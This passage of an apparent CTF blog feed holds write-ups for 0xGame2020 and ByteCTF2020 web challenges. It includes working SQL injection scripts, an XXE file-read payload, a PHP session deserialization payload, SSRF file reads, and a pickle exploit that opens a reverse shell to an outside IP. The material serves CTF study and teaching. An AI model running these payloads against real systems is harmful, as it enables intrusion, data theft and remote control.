&lt;span class=&#34;n&#34;&gt;flag&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;flag{6a55e234-1ed0-455c-bbf3-6df6ddce&amp;#39;&lt;/span&gt;
&lt;span class=&#34;c1&#34;&gt;# flag只能跑到这里，后面的一位任意字母真任意非字母假&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;i&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;range&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;500&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;#这循环一定要大 不然flag长的话跑不完&lt;/span&gt;
    &lt;span class=&#34;n&#34;&gt;hexchar&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;range&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;126&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
        &lt;span class=&#34;n&#34;&gt;hexchar&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;trans&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;flag&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;chr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;char&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;

        &lt;span class=&#34;c1&#34;&gt;# payload = &amp;#34;admin&amp;#39;/**/and/**/ROW(&amp;#39;def&amp;#39;,&amp;#39;ctf&amp;#39;,{},&amp;#39;A&amp;#39;,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21)&amp;#34; \&lt;/span&gt;
        &lt;span class=&#34;c1&#34;&gt;#           &amp;#34;&amp;gt;(table/**/information_schema.tables/**/order/**/by/**/TABLE_SCHEMA/**/limit/**/1,1)#&amp;#34;.format(hexchar)&lt;/span&gt;
        &lt;span class=&#34;c1&#34;&gt;# #表名admin和f11114g&lt;/span&gt;

        &lt;span class=&#34;c1&#34;&gt;# payload = &amp;#34;admin&amp;#39;/**/and/**/ROW(&amp;#39;def&amp;#39;,&amp;#39;ctf&amp;#39;,&amp;#39;admin&amp;#39;,{},5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22)&amp;#34; \&lt;/span&gt;
        &lt;span class=&#34;c1&#34;&gt;#           &amp;#34;&amp;gt;(table/**/information_schema.columns/**/order/**/by/**/TABLE_SCHEMA/**/limit/**/2,1)#&amp;#34;.format(hexchar)&lt;/span&gt;
        &lt;span class=&#34;c1&#34;&gt;# #admin：id,USERNAME,PASSWORD.....打偏了&lt;/span&gt;

        &lt;span class=&#34;c1&#34;&gt;# payload = &amp;#34;admin&amp;#39;/**/and/**/ROW(&amp;#39;def&amp;#39;,&amp;#39;ctf&amp;#39;,&amp;#39;f11114g&amp;#39;,{},5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22)&amp;#34; \&lt;/span&gt;
        &lt;span class=&#34;c1&#34;&gt;#           &amp;#34;&amp;gt;(table/**/information_schema.columns/**/order/**/by/**/TABLE_SCHEMA/**/limit/**/6,1)#&amp;#34;.format(hexchar)&lt;/span&gt;
        &lt;span class=&#34;c1&#34;&gt;# #f11114g：F1LLLAGGG只有一列&lt;/span&gt;

        &lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;admin&amp;#39;/**/and/**/{}&amp;#34;&lt;/span&gt; \
                  &lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;gt;(table/**/ctf.f11114g/**/limit/**/1,1)#&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;format&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;hexchar&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
        &lt;span class=&#34;c1&#34;&gt;#这里本来不需要列名的，注列名是为了搞清楚有几列&lt;/span&gt;

        &lt;span class=&#34;n&#34;&gt;data&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
                &lt;span class=&#34;s1&#34;&gt;&amp;#39;username&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
                &lt;span class=&#34;s1&#34;&gt;&amp;#39;password&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;1&amp;#39;&lt;/span&gt;
        &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
        &lt;span class=&#34;n&#34;&gt;proxies&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
            &lt;span class=&#34;s2&#34;&gt;&amp;#34;http&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;http://127.0.0.1:8080&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
        &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;

        &lt;span class=&#34;k&#34;&gt;try&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
            &lt;span class=&#34;n&#34;&gt;r&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;requests&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;post&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;url&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;url&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;data&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;data&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;proxies&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;proxies&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;timeout&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;except&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
            &lt;span class=&#34;k&#34;&gt;pass&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;char&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;r&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;text&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;data&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;username&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;])&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;password error!&amp;#34;&amp;#39;&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;r&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;text&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
            &lt;span class=&#34;n&#34;&gt;flag&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;chr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;char&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
            &lt;span class=&#34;k&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;flag&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
            &lt;span class=&#34;k&#34;&gt;break&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;说明一下，这个exp有点问题，比如flag中的-会跑出来单引号，遇到的时候手动换一下就好，然后就是跑到最后四位的时候会断掉，后面的玄学跑不出来。
赛后和师傅交流说其实flag可以直接用ascii(substr(flag,1,1))&amp;gt;1的方式来做，因为f11114g表里面只有一个字段。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>0xGame2020出题笔记</title>
        <link>https://anthem-whisper.github.io/p/0xgame2020%E5%87%BA%E9%A2%98%E7%AC%94%E8%AE%B0/</link>
        <pubDate>Fri, 30 Oct 2020 00:00:00 +0000</pubDate>
        
        <guid>https://anthem-whisper.github.io/p/0xgame2020%E5%87%BA%E9%A2%98%E7%AC%94%E8%AE%B0/</guid>
        <description>&lt;img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120181429.png" alt="Featured image of post 0xGame2020出题笔记" /&gt;&lt;p&gt;学校有史以来第一次这么简单的新生赛，我承担平台的运维和web出题。&lt;/p&gt;
&lt;p&gt;第一次出这么多题，虽然题目难度都不大，不过折腾和搞平台环境还是花了不少精力，目的在于三点：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;希望CTF能在学校更普及&lt;/li&gt;
&lt;li&gt;希望能找到有兴趣和有毅力的学弟学妹&lt;/li&gt;
&lt;li&gt;题目很多都是来自入门文档的知识点，看过的一定很容易做出来，希望新同学能认真看资料&lt;/li&gt;
&lt;/ol&gt;
&lt;hr&gt;
&lt;p&gt;题目开源地址：https://github.com/Anthem-whisper/0xGame2020&lt;/p&gt;
&lt;p&gt;所有题目环境：https://shimo.im/docs/8hkRHdRDdWyKycyK&lt;/p&gt;
&lt;p&gt;因为是自费运营，还请师傅们不要恶意破坏环境&lt;/p&gt;
&lt;h3 id=&#34;第一周&#34;&gt;第一周&lt;/h3&gt;
&lt;p&gt;题目都是最简单的入门题目，也不涉及web漏洞，没什么好说的。主要考察同学们配置环境的动手能力。&lt;/p&gt;
&lt;h3 id=&#34;第二周&#34;&gt;第二周&lt;/h3&gt;
&lt;p&gt;出了一道很简单的SQL注入，&lt;/p&gt;
&lt;p&gt;核心是要猜测登录时所拼接的sql语句：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$sql = &amp;quot;select username from user where username=&#39;&amp;quot;. $username .&amp;quot;&#39; and password=&#39;&amp;quot;. $password .&amp;quot;&#39;;&amp;quot;;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;没有任何waf，在用户名处输入&lt;code&gt;admin&#39; or 1=1#&lt;/code&gt;搞定，由于#符号把后面的语句注视掉了，实际上sql语句实际上变成了：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;select username from user where username=&#39;admin&#39; or 1=1
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;1=1是永远成立的，所以必然能返回大于一行的数据，也就是 mysql_num_rows($res)&amp;gt;0，就可以获得flag&lt;/p&gt;
&lt;h3 id=&#34;第三周&#34;&gt;第三周&lt;/h3&gt;
&lt;p&gt;一道XXE，一道SQL布尔盲注&lt;/p&gt;
&lt;h4 id=&#34;inject_me&#34;&gt;inject_me&lt;/h4&gt;
&lt;p&gt;XXE是去年NCTF2019的原题，我在web入门doc里面写过，并且题目地址和源码我都给了。&lt;/p&gt;
&lt;p&gt;在给了hint的情况下这么少的解还是出乎我的意料&lt;/p&gt;
&lt;p&gt;由HTTP响应里面返回的标签以及Content-Type是xml格式可以很轻易的百度到XXE这种攻击手段&lt;/p&gt;
&lt;p&gt;XXE学习：https://xz.aliyun.com/t/3357&lt;/p&gt;
&lt;p&gt;告诉了/flag，那么随手一个payload就出来了：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;?xml version=&amp;quot;1.0&amp;quot;?&amp;gt;
&amp;lt;!DOCTYPE dy [
&amp;lt;!ENTITY dy SYSTEM &amp;quot;file:///flag&amp;quot;&amp;gt;
]&amp;gt;
&amp;lt;user&amp;gt;&amp;lt;username&amp;gt;&amp;amp;dy;&amp;lt;/username&amp;gt;&amp;lt;password&amp;gt;123&amp;lt;/password&amp;gt;&amp;lt;/user&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;h4 id=&#34;close_eyes&#34;&gt;close_eyes&lt;/h4&gt;
&lt;p&gt;布尔盲注很多同学用手打，本来目的是想叫你们去学python的，结果硬是手打出来了，下次出个128位的flag（bushi&lt;/p&gt;
&lt;p&gt;本来想稍微加点waf的，后来不想出难了就没加，开SQLmap的莫得灵魂。&lt;/p&gt;
&lt;p&gt;布尔盲注学习：https://xz.aliyun.com/t/7169#toc-2&lt;/p&gt;
&lt;p&gt;这篇文章不仅仅讲了盲注也讲了其他的一些手法，值得钻研一番&lt;/p&gt;
&lt;p&gt;思路就是语句为假的时候（比如我用户名输入1&#39;||1=0#或者乱输一个用户名密码），页面回显“数据库里没你这号人,别想骗劳资.jpg”&lt;/p&gt;
&lt;p&gt;为真的时候（比如我输入1&#39;||1=1#）页面回显“数据库有你这号人，那又怎么着？”，根据回显情况的不同，我们就可以判断我们的condition究竟是真还是假。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;1&#39;||(condition)#
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;不断地改变condition就可以查到我们想要的数据；&lt;/p&gt;
&lt;p&gt;举个例子：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;1&#39;||length(database())&amp;gt;1#
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;判断数据库名字的长度是不是大于1，页面返回“数据库有你这号人，那又怎么着？”，那么我们就可以确定数据库名字长度大于1。&lt;/p&gt;
&lt;p&gt;类似的：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;1&#39;||ascii(substr(database(),1,1))=117#
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;可判断数据库第一个字母是ASCII码为117的字母，也就是‘u&#39;。&lt;/p&gt;
&lt;p&gt;也可以使用二分法进行盲注。&lt;/p&gt;
&lt;p&gt;exp：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;#python3
#wh1sper
import requests
host = &#39;http://59.110.157.4:30052/login.php&#39;
def mid(bot, top):
    return (int)(0.5 * (top + bot))
def sqli():
    name = &#39;&#39;
    for j in range(1, 250):
        top = 126
        bot = 32
        while 1:
            babyselect = &#39;database()&#39;#user
            #babyselect = &#39;(select table_name from information_schema.tables where table_schema=database())&#39;#user
            #babyselect = &amp;quot;(select group_concat(column_name) from information_schema.columns &amp;quot; \
            #            &amp;quot;where table_schema=database() and table_name=&#39;user&#39;)&amp;quot;#id,username,password
            #babyselect = &amp;quot;(select group_concat(password) from user)&amp;quot;#0xGame{blind_sqli_1s_not_hard}
            data = {
                &amp;quot;password&amp;quot;: &amp;quot;1&amp;quot;,
                &amp;quot;username&amp;quot;: &amp;quot;1&#39;||ascii(substr({},{},1))&amp;gt;{}#&amp;quot;.format(babyselect, j, mid(bot, top))
            }
            r = requests.post(url=host, data=data)
            #print(r.text)
            print(data)
            if &#39;数据库有你这号人&#39; in r.text:#子查询为真
                if top - 1 == bot:
                    name += chr(top)
                    print(name)
                    break
                bot = mid(bot, top)
            else:
                if top - 1 == bot:
                    name += chr(bot)
                    print(name)
                    break
                top = mid(bot, top)
if __name__ == &#39;__main__&#39;:
    sqli()
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;第四周&#34;&gt;第四周&lt;/h3&gt;
&lt;h4 id=&#34;broken_motto&#34;&gt;broken_motto&lt;/h4&gt;
&lt;p&gt;session反序列化，也是文档里面出现过的&lt;/p&gt;
&lt;p&gt;&amp;gt;&amp;gt;&lt;a class=&#34;link&#34; href=&#34;https://www.mi1k7ea.com/2019/04/21/PHP-session%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%bc%8f%e6%b4%9e/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;学习链接&lt;/a&gt;，建议自己本地动手搭一个环境&lt;/p&gt;
&lt;p&gt;在profile.php里面里面有一行注释：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;//ini_set(&#39;session.serialize_handler&#39;,&#39;php_serialize&#39;);
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这行代码使用的Session序列化选择器是php_serialize，注释之后默认使用的是php&lt;/p&gt;
&lt;p&gt;两种选择器的不同的处理方式导致了session反序列化的漏洞的产生，存session的时候，存入php_serialize经过serialize()函数序列处理的数组&lt;/p&gt;
&lt;p&gt;读取的时候php以键名 ＋ 竖线 ＋ 经过 serialize() 函数序列化的数据处理如果你注册的时候加一个|，他会把&lt;code&gt;|&lt;/code&gt;前面的忽略掉，只反序列化后面的，就可以造成对象注入。&lt;/p&gt;
&lt;p&gt;exp：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;?php
 
class info{
    public $admin;
    public $username;
    public $motto;
 
}
 
$pop = new info();
$pop-&amp;gt;admin = 1;
echo serialize($pop);
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;payload：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;|O:4:&amp;quot;info&amp;quot;:3:{s:5:&amp;quot;admin&amp;quot;;i:1;s:8:&amp;quot;username&amp;quot;;N;s:5:&amp;quot;motto&amp;quot;;N;}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这次比赛总的来说呢，还是很成功的，相信同学们都找到了自己心里一直想追求的方向，当然，比赛中也不乏表现突出的选手，希望你们能坚持下去，去追求更深的技术，更好的未来&lt;/p&gt;
</description>
        </item>
        <item>
        <title>ByteCTF2020复现</title>
        <link>https://anthem-whisper.github.io/p/bytectf2020%E5%A4%8D%E7%8E%B0/</link>
        <pubDate>Wed, 28 Oct 2020 00:00:00 +0000</pubDate>
        
        <guid>https://anthem-whisper.github.io/p/bytectf2020%E5%A4%8D%E7%8E%B0/</guid>
        <description>&lt;img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210228105539.jpeg" alt="Featured image of post ByteCTF2020复现" /&gt;&lt;p&gt;这次ByteCTF2020的web题目非常顶，第一天比赛快结束的时候全场web才有了第一个解，后来解人数最多的XSS也就不过十个解，可惜一直在看爬虫的题，最后还是没做出。&lt;/p&gt;
&lt;hr&gt;
&lt;h3 id=&#34;easy_scrapy&#34;&gt;easy_scrapy&lt;/h3&gt;
&lt;p&gt;考点：MD5爆破、SSRF&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120181318.png&#34; alt=&#34;img&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;功能是添加一个http://或者https://开头的URL，并且要求输入验证码，可以利用以下脚本来爆破：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;import hashlib
 
for i in range(99999999):
    if hashlib.md5(str(i).encode(&#39;UTF-8&#39;)).hexdigest()[:6] == &#39;2c97b3&#39;:
        print(i)
        break
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;十几秒能出结果，之后可以BP重放数据包来快速的添加。&lt;/p&gt;
&lt;p&gt;添加成功之后可以在MyUrlList里面看到添加记录，点进去可以看到爬取到的东西。&lt;/p&gt;
&lt;p&gt;监听端口接收到请求：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;GET / HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en
User-Agent: scrapy_redis
Accept-Encoding: gzip, deflate
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;发现是scrapy_redis，初步猜测是SSRF打redis。&lt;/p&gt;
&lt;p&gt;既然他是爬虫，那么遇到类似于&lt;!-- raw HTML omitted --&gt;这种标签的话，他很有可能就会去请求，（后来放了HINT，叫去读这个页面的源码）尝试爬以下这道题的公网IP，发现他会把/list的源码一并爬下来，那么我们可以起一个页面来指向&lt;code&gt;file:///etc/passwd&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;比赛的时候我用的是302重定向好像不行（哭了），其实这里他遇到一个&lt;!-- raw HTML omitted --&gt;标签就会去请求：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120181325.png&#34; alt=&#34;img&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;我们可以发现他请求到了我们想要的URL：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120181330.png&#34; alt=&#34;img&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;把&lt;!-- raw HTML omitted --&gt;标签的href改成file协议果然可以造成任意文件读：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120181342.png&#34; alt=&#34;img&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;这样的话我们可以逐一的读取他爬虫的源码，但是在这之前我们要先知道爬虫工作的绝对路径，可以通过读&lt;code&gt;/proc/self/environ&lt;/code&gt;，得到绝对路径PWD=/code，这个知识点在本站[&lt;a class=&#34;link&#34; href=&#34;http://wh1sper.com/buuoj%e5%88%b7%e9%a2%98%e8%ae%b0%e5%bd%953/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;SWPU2019]Web3&lt;/a&gt;也提到过。&lt;/p&gt;
&lt;p&gt;在&lt;a class=&#34;link&#34; href=&#34;https://scrapy-chs.readthedocs.io/zh_CN/0.24/intro/tutorial.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;官方文档&lt;/a&gt;中找到了这个爬虫框架的结构：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;tutorial/
    scrapy.cfg
    tutorial/
        __init__.py
        items.py
        pipelines.py
        settings.py
        spiders/
            __init__.py
            ...
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;我们尝试去读取这些文件；&lt;/p&gt;
&lt;p&gt;scrapy.cfg:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;# Automatically created by: scrapy startproject
#
# For more information about the [deploy] section see:
# https://scrapyd.readthedocs.io/en/latest/deploy.html
 
[settings]
default = bytectf.settings
 
[deploy]
#url = http://localhost:6800/
project = bytectf
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;对照着文档我们可以看到项目文件夹的名称是bytectf，不过在bytectf/spider文件夹下的爬虫名称却似乎是自定义的名字。&lt;/p&gt;
&lt;p&gt;读取&lt;code&gt;/proc/self/cmdline&lt;/code&gt;，这个文件包含进程的完整命令行信息，我们可以根据他来得知正在运行的爬虫的文件名称。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;/usr/local/bin/python /usr/local/bin/scrapy crawl byte
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;得知爬虫名字叫做byte。&lt;/p&gt;
&lt;p&gt;读取之，得到&lt;a class=&#34;link&#34; href=&#34;https://github.com/Anthem-whisper/CTFWEB_sourcecode/raw/main/ByteCTF2020/bytectf_easy_scrapy.zip&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;源码&lt;/a&gt;，结构大概如下：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;/code/
  requirement.txt
  scrapy.cfg
  bytectf/
    __init__.py 
    items.py 
    pipelines.py 
    settings.py 
    spiders/ 
      __init__.py 
      byte.py
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;由源码可知：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;172.20.0.8:6379为内网Redis
172.20.0.7:27017为mongodb
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;打一通之后没有任何回显，甚至不能确定这两个主机是否存活。&lt;/p&gt;
&lt;p&gt;根据hint，得到源码之后我们可以本地起一个环境来调试，同时，从&lt;a class=&#34;link&#34; href=&#34;https://blog.csdn.net/zwq912318834/article/details/78854571&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;这篇文章&lt;/a&gt;里面我们得知redis-scrapy的运作方式:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120181356.png&#34; alt=&#34;img&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;作为一个分布式爬虫，是需要有一个Master端（核心服务器）的，在Master端，会搭建一个Redis数据库，用来存储start_urls、request、items。Master的职责是负责url指纹判重，Request的分配，以及数据的存储（一般在Master端会安装一个mongodb用来存储redis中的items）。出了Master之外，还有一个角色就是slaver（爬虫程序执行端），它主要负责执行爬虫程序爬取数据，并将爬取过程中新的Request提交到Master的redis数据库中。&lt;/p&gt;
&lt;p&gt;这和我们之前的猜想SSRF+Redis是越来越接近的。&lt;/p&gt;
&lt;p&gt;但是用用爬虫去打Redis是打不到东西的，我们可以在源码里面看到scrapy.Request，他是不支持gopher和dict协议的。&lt;/p&gt;
&lt;p&gt;哪里还有SSRF的点呢？&lt;/p&gt;
&lt;p&gt;当然是在点击爬取链接的时候：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;?url=https://baidu.com
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120181407.png&#34; alt=&#34;img&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;监听到请求的UA是&lt;code&gt;PycURL&lt;/code&gt;，这个东西和curl差不多，是支持gopher等协议的，我们就可以利用这里去打redis。&lt;/p&gt;
&lt;p&gt;不过遗憾的是，这里的是ssrf仍然是没有回显，难以判断我们的payload是否起作用。&lt;/p&gt;
&lt;p&gt;此题最难发现的点我感觉就是这个pickle反序列化，此时有两种发现pickle反序列化的方法：&lt;/p&gt;
&lt;p&gt;1.本地起一个scrapy_redis环境，去看redis里面的东西，发现序列化数据（操作有难度，也许会遇到很多问题）&lt;/p&gt;
&lt;p&gt;2.爬虫第4行使用了scrapy_redis库，去看这个的源码，可以发现它在存取数据的过程中使用了pickle的序列化方式，并且还可以发现，它会将request对象存入&lt;code&gt;爬虫名:requests&lt;/code&gt;这样的有序列表中。&lt;/p&gt;
&lt;p&gt;既然有序列化那必然存在反序列化，利用反序列化来反弹shell。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;byte:requests&lt;/code&gt;有序列表是zset的，我们gopher打的时候需要zset。&lt;/p&gt;
&lt;p&gt;贴一个官方exp：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;import pickle
import os
from urllib.parse import quote
class exp(object):
    def __reduce__(self):
        s = &amp;quot;&amp;quot;&amp;quot;python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&amp;quot;119.45.184.10&amp;quot;,7777));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&amp;quot;/bin/sh&amp;quot;,&amp;quot;-i&amp;quot;]);&#39;&amp;quot;&amp;quot;&amp;quot;
        return (os.system, (s,))
test = str(pickle.dumps(exp()))
poc = test.replace(&amp;quot;\n&amp;quot;,&#39;\\n&#39;).replace(&amp;quot;\&amp;quot;&amp;quot;,&amp;quot;\\\&amp;quot;&amp;quot;)[2:-1]
